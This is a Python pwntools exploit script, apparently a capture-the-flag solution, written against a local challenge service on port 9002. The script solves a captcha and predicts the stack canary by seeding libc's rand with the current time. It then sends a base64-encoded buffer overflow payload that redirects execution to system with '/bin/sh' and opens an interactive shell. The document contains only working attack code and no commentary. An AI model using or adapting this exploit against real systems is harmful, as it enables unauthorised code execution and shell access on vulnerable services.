from pwn import *
from ctypes import *
from time import time

context(log_level="debug", arch="i386", os="linux")

r = remote("0", 9002)
r.recvuntil(" : ")
captcha = int(r.recvline())
r.sendline(str(captcha))

call_system = 0x08049187
g_buf = 0x804b0e0

libc = CDLL("libc.so.6")
libc.srand(int(time()))
arr = [libc.rand() for _ in range(8)]
canary = captcha + arr[3] + arr[6] - arr[1] - arr[2] - arr[4] - arr[5] - arr[7]
canary &= 0xffffffff
payload = cyclic(512) + p32(canary) + cyclic(12) + p32(call_system) + p32(g_buf + 537 * 4 / 3)
payload = b64e(payload) + b"/bin/sh\x00"
r.sendlineafter("paste me!\n", payload)
r.interactive()